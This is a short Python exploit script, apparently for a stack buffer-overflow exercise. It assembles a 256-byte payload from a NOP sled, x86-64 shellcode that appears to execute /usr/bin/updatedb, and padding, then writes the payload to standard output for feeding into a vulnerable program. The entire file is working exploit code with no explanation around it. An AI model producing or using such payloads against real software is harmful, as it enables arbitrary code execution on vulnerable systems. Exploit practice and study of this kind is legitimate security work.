#!/usr/bin/python3

import sys

#Payload length: Size of the first input
payload_length = 256

# Payload
shellcode = b"\xeb\x13\x5b\x48\x31\xd2\x52\x88\x53\x11\x53\x48\x89\xe6\x53\x5f\x6a\x3b\x58\x0f\x05\xe8\xe8\xff\xff\xff/usr/bin/updatedbx"

nop_sled = b"\x90" * 128
padding = b"B" * (256 - len(nop_sled) - len(shellcode))

exploit = (nop_sled + shellcode + padding)

sys.stdout.buffer.write(exploit)
